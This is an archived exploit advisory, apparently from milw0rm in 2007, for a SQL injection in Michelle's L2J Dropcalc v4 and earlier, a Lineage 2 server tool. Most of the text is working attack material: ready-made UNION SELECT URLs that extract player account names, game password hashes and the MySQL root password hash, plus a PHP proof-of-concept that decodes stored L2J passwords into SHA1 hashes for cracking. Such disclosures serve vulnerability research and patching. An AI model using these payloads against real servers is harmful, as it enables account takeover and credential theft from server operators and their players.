<html><head><title>Michelles L2J Dropcalc <= v4 Remote SQL Injection Vulnerability</title></head><pre>#==============================================================================================
#  Title: Michelle's L2J Dropcalc
#  Version: &lt;= v4
#  Web Site: http://www.msknight.com/comps/lineage2/myl2jdropcalc.htm
#
#  Discovered By: Codebreak (codebreak1984@gmail.com | www.codebreak.tk)
#
#==============================================================================================
#  SQL Injection: (*** Must be logged in, using your own username and Token ***)
#
#  http://[Target]/[Path]/i-search.php?itemid=&amp;username=[User]&amp;token=[Token]&amp;langval=lang-eng.php&amp;server_id=0&amp;skin_id=0&amp;itemid=[SQL]
#
#  Example:
#
#   Obtain a player username:
#   http://[Target]/[Path]/i-search.php?itemid=&amp;username=[User]&amp;token=[Token]&amp;langval=lang-eng.php&amp;server_id=0&amp;skin_id=0&amp;itemid=-1 UNION select null,account_name,null,null,null,null,null from characters where char_name = &quot;[PLAYER]&quot;
#
#   Obtain a password for that username (*** encrypted): 
#    * only valid if loginserver and gameserver are in the same machine
#   http://[Target]/[Path]/i-search.php?itemid=&amp;username=[User]&amp;token=[Token]&amp;langval=lang-eng.php&amp;server_id=0&amp;skin_id=0&amp;itemid=-1 UNION select null,password,null,null,null,null,null from accounts where login = &quot;[USERNAME]&quot;
#
#
#  Bonus:
#   
#   Obtain MYSQL Password (encrypted):
#    *only valid if the script is executed with root accounts.
#   http://[Target]/[Path]/i-search.php?itemid=&amp;username=[User]&amp;token=[Token]&amp;langval=lang-eng.php&amp;server_id=0&amp;skin_id=0&amp;itemid=-1 UNION select null,Password,null,null,null,null,null from mysql.user where User = &quot;root&quot; and host=&quot;localhost&quot;
#
#   *** L2J Encrypted Password can be decoded into a SHA1 hash. I've made a script to do that and it's included in this file
#
###############################################################################################


&lt;--------- Beginning of PHP Script ---------&gt;

&lt;style type=&quot;text/css&quot;&gt;
&lt;!--
.style3 {font-size: 24px}
.style1 {color: #CC0000}
--&gt;
&lt;/style&gt;
&lt;?
echo(&quot;&lt;title&gt;L2J Pass Decoding - POC&lt;/title&gt;&quot;);
$pass = $_POST['decode']; 
$unpass3 = base64_decode($pass);


$array = unpack(&quot;H*&quot;, $unpass3);
foreach ($array as $key =&gt; $value)
$unpass2 = $array[1];


echo(&quot;&lt;span class=style1&gt;&lt;b&gt;&lt;u&gt;Decoding Password&lt;/u&gt;&lt;/b&gt;&lt;/span&gt;&quot;);

echo(&quot;&lt;br&gt;&lt;b&gt;Base 64:&lt;/b&gt; $pass&lt;br&gt;&quot;);
echo(&quot;&lt;b&gt;Unpacked:&lt;/b&gt; $unpass3&lt;br&gt;&quot;);
echo(&quot;&lt;br&gt;&lt;b&gt;SHA1:&lt;/b&gt; $unpass2&lt;br&gt;&quot;);
?&gt;
&lt;form name=&quot;form1&quot; method=&quot;post&quot; action=&quot;&quot;&gt;
  &lt;div align=&quot;center&quot;&gt;
    &lt;input type=&quot;text&quot; name=&quot;decode&quot;&gt;
    &lt;input type=&quot;submit&quot; value=&quot;Decode&quot;&gt;
  &lt;/div&gt;
&lt;/form&gt;
&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;center&gt;&lt;i&gt;Created by Codebreak&lt;/center&gt;&lt;/i&gt;

&lt;------------- End of Script -------------&gt;

# milw0rm.com [2007-01-31]</pre></html>